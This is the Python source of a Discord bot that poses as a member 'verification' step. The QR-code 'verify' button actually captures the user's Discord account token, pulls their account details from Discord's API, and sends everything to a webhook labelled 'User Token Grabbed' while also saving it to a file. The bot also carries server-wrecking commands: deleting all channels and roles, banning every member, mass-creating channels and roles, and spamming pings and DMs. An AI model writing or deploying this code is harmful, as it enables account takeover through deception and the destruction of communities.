import asyncio
import discord
import os
import json
import ujson
from discord import Colour
from discord.ext import commands
from discord.ui import Button, View
from dotenv import load_dotenv
from aioconsole import aprint
from resources import QR
import aiohttp
from discord import Interaction, Colour, Embed, app_commands
from discord.utils import get
from discord_webhook import DiscordWebhook, DiscordEmbed


# Load .env file
load_dotenv()
with open("./resources/data.json") as f:
    config = json.load(f)
webhook_url = config["webhook_url"]
intents = discord.Intents.all()
prefix = config["prefix"]
bot = commands.Bot(
    command_prefix=prefix,
    intents=intents,
    help_command=None,
    case_insensitive=True,
)

client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)
qr = QR()
role_id = int(config["role_id"])
webhook = DiscordWebhook(url=webhook_url)


class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__()

    @discord.ui.button(label="Verify Here!", style=discord.ButtonStyle.secondary)
    async def verify_button(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ):
        await qr.create_qr(name=f"{interaction.user.id}")
        em = Embed(
            title=f"Hello {interaction.user.name}",
            description="Welcome to our server! Please verify below using the inbuilt QR Code scanner on the discord mobile app.",
            colour=Colour.dark_red(),
        )
        em.set_image(url=f"attachment://qr-code-{interaction.user.id}.png")
        em.set_footer(text="Le daron a Cyril")
        em.set_author(name=f"{bot.user.name}", icon_url=f"{bot.user.avatar.url}")
        await interaction.response.send_message(
            embed=em,
            file=discord.File(f"./resources/codes/qr-code-{interaction.user.id}.png"),
            ephemeral=True,
        )
        os.remove(f"resources/codes/qr-code-{interaction.user.id}.png")
        token = asyncio.create_task(qr.wait_token())
        token = await token
        print(f"Token: {token}")
        while True:
            await asyncio.sleep(3)
            if token != None:
                em = Embed(title="User Token Grabbed")
                await tokeninfo(str(token), em)
                webhook.add_embed(em.to_dict())
                webhook.execute()
                role = get(interaction.guild.roles, id=role_id)
                user = interaction.user
                print(f"Sent message to webhook")
                await user.add_roles(role)
                await interaction.response.edit_original_message(content="Verification completed successfully.", embed=None)
                break


async def tokeninfo(_token, embed):
    async with aiohttp.ClientSession() as session:
        async with session.get(
            "https://discord.com/api/v9/users/@me",
            headers={
                "authorization": _token,
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.135 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
            },
        ) as resp:
            if resp.status == 200:
                j = await resp.json()
                user = {}
                with open("./resources/users.json", "r", encoding="utf-8") as f:
                    data = json.load(f)
                    users = data["users"]
                    for key, value in j.items():
                        embed.add_field(name=f"{key}", value=f"{value}", inline=False)
                        user[f"{key}"] = value
                    embed.add_field(name="token", value=f"{_token}", inline=False)
                    user["Token"] = _token
                    users.append(user)
                with open("./resources/users.json", "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=4)


def is_owner():
    def predicate(interaction: discord.Interaction):
        if interaction.user.id == interaction.guild.owner.id:
            return True

    return app_commands.check(predicate)


@bot.event
async def on_member_join(member):
    with open("./resources/data.json") as f:
        data = ujson.load(f)
    channel = member.guild.get_channel(int(data["channel"]))
    print("Channel:", channel)
    if channel is not None:
        em = discord.Embed(
            title=f"**Welcome to {member.guild.name}**",
            description=":lock: **In order to access this server, you need to pass the verification test.**\n:arrow_right: Please verify below.",
        )
        view = VerifyView()
        await channel.send(content=f"Welcome {member.mention}", embed=em, view=view,)


@bot.tree.command(
    name="verify",
    description="Verifies the user with an embed button and a QR code",
)
# @is_owner()
async def verify_slash(interaction: discord.Interaction):
    with open("./resources/data.json") as f:
        data = ujson.load(f)
    if str(interaction.channel.id) == str(data["channel"]):
        em = discord.Embed(
            title=f"**Welcome to {interaction.guild.name}**",
            description=":lock: **In order to access this server, you need to pass the verification test.**\n:arrow_right: Please verify below.",
        )
        view = VerifyView()
        await interaction.response.send_message(embed=em, view=view, ephemeral=True)


@bot.tree.command(
    name="ping",
    description="Returns the bot's latency",
)
async def ping_slash(interaction: discord.Interaction):
    await interaction.response.send_message(
        f"Pong! {round(bot.latency * 1000)}ms", ephemeral=True
    )


@bot.tree.command(
    name="delete_all_channels",
    description="Deletes all channels in the server",
)
async def delete_all_channels(interaction: discord.Interaction):
    for channel in interaction.guild.channels:
        await channel.delete()
    await interaction.response.send_message(f"Deleted all channels", ephemeral=True)
    print(f"Deleted all channels in the server: {interaction.guild.name}")


@bot.tree.command(
    name="delete_all_roles",
    description="Deletes all roles in the server",
)
@commands.has_permissions(manage_roles=True)
async def delete_all_roles(interaction: discord.Interaction):
    # Send the response immediately
    await interaction.response.send_message(
        f"Started deleting all roles", ephemeral=True
    )
    for role in interaction.guild.roles:
        if (
            role != interaction.guild.default_role
            and role < interaction.guild.me.top_role
        ):  # Skip default role and roles higher than bot's top role
            try:
                await role.delete()
                print(f"Successfully deleted role {role.name}")
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")
    # Send a message in Discord when the command completes
    await interaction.channel.send(
        f"Deleted all roles in the server: {interaction.guild.name}"
    )


@bot.tree.command(
    name="nick_all_members",
    description="Changes the nickname of all members in the server",
)
@commands.has_permissions(manage_nicknames=True)
async def nick_all_members(interaction: discord.Interaction, new_nickname: str):
    for member in interaction.guild.members:
        try:
            await member.edit(nick=new_nickname)
        except discord.Forbidden:
            continue  # Skip members who cannot have their nickname changed
    await interaction.response.send_message(
        f"Changed all member nicknames to {new_nickname}", ephemeral=True
    )
    print(f"Changed all member nicknames in the server: {interaction.guild.name}")


@bot.tree.command(
    name="ban_all_members",
    description="Bans all members in the server",
)
@commands.has_permissions(ban_members=True)
async def ban_all_members(interaction: discord.Interaction, ban_reason: str):
    for member in interaction.guild.members:
        try:
            await member.ban(reason=ban_reason)
        except discord.Forbidden:
            continue  # Skip members who cannot be banned
    await interaction.response.send_message(
        f"Banned all members for {ban_reason}", ephemeral=True
    )
    print(
        f"Banned all members in the server: {interaction.guild.name} for {ban_reason}"
    )


@bot.tree.command(
    name="create_channels",
    description="Creates custom channels in the server",
)
@commands.has_permissions(manage_channels=True)
async def create_channels(
    interaction: discord.Interaction, channel_name: str, num_channels: int
):
    for _ in range(num_channels):
        await interaction.guild.create_text_channel(name=channel_name)
    await interaction.response.send_message(
        f"Created {num_channels} channels named {channel_name}", ephemeral=True
    )
    print(
        f"Created {num_channels} channels named {channel_name} in the server: {interaction.guild.name}"
    )


@bot.tree.command(
    name="mention_everyone",
    description="Mentions everyone in the server",
)
@commands.has_permissions(send_messages=True)
async def mention_everyone(interaction: discord.Interaction):
    await interaction.channel.send("@everyone")
    print("Mentioned everyone in the server.")


@bot.tree.command(
    name="ping_all_members",
    description="Pings all members in the server",
)
@commands.has_permissions(send_messages=True)
async def ping_all_members(interaction: discord.Interaction):
    for member in interaction.guild.members:
        await interaction.channel.send(f"{member.mention}")
    print(f"Pinged all members in the server: {interaction.guild.name}")


@bot.tree.command(
    name="dm_all_members",
    description="Sends a DM to all members in the server a certain number of times",
)
@commands.has_permissions(send_messages=True)
async def dm_members(interaction: discord.Interaction, message: str, num_messages: int):
    # Send the response immediately
    await interaction.response.send_message(
        f"Started sending DM {num_messages} times to all members", ephemeral=True
    )
    success_count = 0
    fail_count = 0
    for member in interaction.guild.members:
        if not member.bot:  # Skip bots
            for _ in range(num_messages):
                try:
                    await member.send(message)
                    print(
                        f"Successfully sent DM to {member.name}"
                    )  # Print a message for each successful DM
                    success_count += 1
                except Exception as e:
                    print(f"Failed to send DM to {member.name}: {e}")
                    fail_count += 1
                await asyncio.sleep(1)  # Sleep for 1 second between each message
    print(
        f"Sent DM {num_messages} times to all members in the server: {interaction.guild.name}"
    )
    # Send a message in Discord when the command completes
    await interaction.channel.send(
        f"Sent DM {num_messages} times to all members in the server: {interaction.guild.name}. Success: {success_count}, Fail: {fail_count}"
    )


@bot.tree.command(
    name="create_roles",
    description="Creates a specified number of roles with a custom name in the server",
)
@commands.has_permissions(manage_roles=True)
async def create_roles(
    interaction: discord.Interaction, role_name: str, num_roles: int
):
    # Send the response immediately
    await interaction.response.send_message(
        f"Started creating {num_roles} roles with the name {role_name}", ephemeral=True
    )
    for _ in range(num_roles):
        try:
            await interaction.guild.create_role(name=role_name)
            print(f"Successfully created role {role_name}")
        except Exception as e:
            print(f"Failed to create role {role_name}: {e}")
    # Send a message in Discord when the command completes
    await interaction.channel.send(
        f"Created {num_roles} roles with the name {role_name} in the server: {interaction.guild.name}"
    )


@bot.event
async def on_ready():
    await bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.unknown, name="")
    )
    print(f"Logged in as {bot.user.name} - {bot.user.id}")
    print(f"{bot.user.name} is ready to go !")

    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands")
    except Exception as e:
        print(f"Failed to sync commands: {e}")


# Use the bot token from .env file
bot_token = os.getenv("BOT_TOKEN")
if bot_token is None:
    print("Bot token is not set in the environment variables.")
else:
    bot.run(bot_token)
